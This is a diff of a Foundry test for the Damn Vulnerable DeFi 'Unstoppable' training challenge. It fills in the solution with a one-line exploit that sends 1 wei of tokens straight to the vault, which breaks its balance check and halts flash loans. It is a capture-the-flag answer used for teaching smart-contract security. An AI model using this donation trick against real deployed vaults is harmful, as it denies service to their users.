@@ -1,11 +1,12 @@
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma solidity =0.8.25;
+pragma solidity ^0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
 
 contract UnstoppableChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,10 +93,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        token.transfer(address(vault), 1); // 1 wei is enough for disruption
     }
 
-    /**
+    /** 
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private {
